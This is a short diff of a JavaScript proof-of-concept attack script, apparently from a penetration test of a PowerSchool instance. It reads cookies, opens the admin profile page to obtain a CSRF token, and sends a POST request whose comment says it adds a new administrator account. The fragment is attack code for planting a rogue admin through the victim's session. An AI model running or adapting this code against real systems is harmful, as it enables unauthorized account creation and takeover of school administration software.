@@ -17,11 +17,9 @@ function getCookie(cname)
   return "";
 }
 
-
+window.open("https://pentest.sfe.powerschool.com/profileMainNewInitAction.do");
 // add new administrator account
 var httpRequest = new XMLHttpRequest();//
-httpRequest.open('GET', 'https://pentest.sfe.powerschool.com/profileMainNewInitAction.do', true);// update the CSRF token
-httpRequest.send();
 
 
 httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); 
